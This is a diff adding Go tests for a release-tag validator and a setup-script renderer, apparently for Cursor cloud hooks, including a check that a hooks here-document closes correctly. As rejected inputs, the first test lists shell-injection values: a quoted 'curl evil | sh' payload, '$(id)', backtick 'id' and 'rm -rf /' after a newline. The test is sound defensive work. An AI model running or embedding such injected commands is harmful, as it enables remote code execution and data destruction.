@@ -260,3 +260,44 @@ func TestCloudPrintHooksRejectsLogPathOutsideSandbox(t *testing.T) {
 		}
 	}
 }
+
+// The setup scripts put --version inside double quotes, where a $(...) or backtick would still run.
+func TestCloudSetupRefusesVersionsThatAreNotReleaseTags(t *testing.T) {
+	for _, version := range []string{"v1.3.60", "v0.0.50", "v1.4.0-rc.1"} {
+		if err := checkCloudReleaseTag(version); err != nil {
+			t.Errorf("checkCloudReleaseTag(%q) = %v, want nil", version, err)
+		}
+	}
+	for _, version := range []string{"", "1.3.60", "v1.3", `v1.3.60"; curl evil | sh; "`, "v1.3.60$(id)", "v1.3.60`id`", "v1.3.60\nrm -rf /"} {
+		if err := checkCloudReleaseTag(version); err == nil {
+			t.Errorf("checkCloudReleaseTag(%q) = nil, want an error", version)
+		}
+		if _, err := renderCursorCloudSetup(version, false); err == nil {
+			t.Errorf("renderCursorCloudSetup(%q) rendered a script", version)
+		}
+	}
+}
+
+// The hooks file is a here-document body; it must end in a newline and never hold the delimiter line.
+func TestRenderCursorCloudSetupClosesItsHooksHereDocument(t *testing.T) {
+	for _, safe := range []bool{false, true} {
+		got, err := renderCursorCloudSetup("v1.3.60", safe)
+		if err != nil {
+			t.Fatal(err)
+		}
+		opening := "<<'" + cursorHooksDelimiter + "'\n"
+		start := strings.Index(got, opening)
+		if start < 0 {
+			t.Fatalf("no quoted here-document in:\n%s", got)
+		}
+		body := got[start+len(opening):]
+		end := strings.Index(body, "\n"+cursorHooksDelimiter+"\n")
+		if end < 0 {
+			t.Fatalf("here-document never closes:\n%s", got)
+		}
+		var hooks map[string]any
+		if err := json.Unmarshal([]byte(body[:end]), &hooks); err != nil {
+			t.Fatalf("here-document body is not the hooks JSON: %v\n%s", err, body[:end])
+		}
+	}
+}
